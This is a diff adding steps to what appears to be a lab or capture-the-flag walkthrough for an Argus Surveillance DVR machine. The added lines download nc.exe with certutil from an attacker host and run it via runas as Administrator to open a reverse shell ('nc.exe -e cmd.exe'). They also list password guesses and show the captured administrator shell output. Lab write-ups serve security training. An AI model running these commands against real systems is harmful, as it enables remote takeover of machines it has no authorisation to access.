@@ -122,7 +122,28 @@ Why It's Important:
 This code is likely part of a larger system or script to analyze and understand the structure of a password hash.
 It helps identify specific segments and their corresponding information.
 
-There are no symbols so lets check them one by one for the last entry
+There are no symbols so lets check them one by one for the last entry.
+upload the nc.exe file:
+C:\ProgramData\PY_Software\Argus Surveillance DVR>certutil -urlcache -split -f http://192.168.49.x/nc.exe
+```
+## runas shell
+```
+Run as administrator
+C:\ProgramData\PY_Software\Argus Surveillance DVR>runas /env /profile /user:Administrator “C:\ProgramData\PY_Software\Argus Surveillance DVR\nc.exe -e cmd.exe 192.168.49.x 21”
 
+Check one by one:
 
+14WatchD0g!
+14WatchD0g@
+14WatchD0g#
+14WatchD0g$
+14WatchD0g$ Enter the password for Administrator: 
+Attempting to start C:\ProgramData\PY_Software\Argus Surveillance DVR\nc.exe -e cmd.exe 192.168.49.249 21 as user “DVR4\Administrator” …
+
+connect to [192.168.49.249] from (UNKNOWN) [192.168.249.179] 51075
+Microsoft Windows [Version 10.0.19044.1645]
+© Microsoft Corporation. All rights reserved.C:\ProgramData\PY_Software\Argus Surveillance DVR>whoami
+whoami
+dvr4\administrator
+```
 
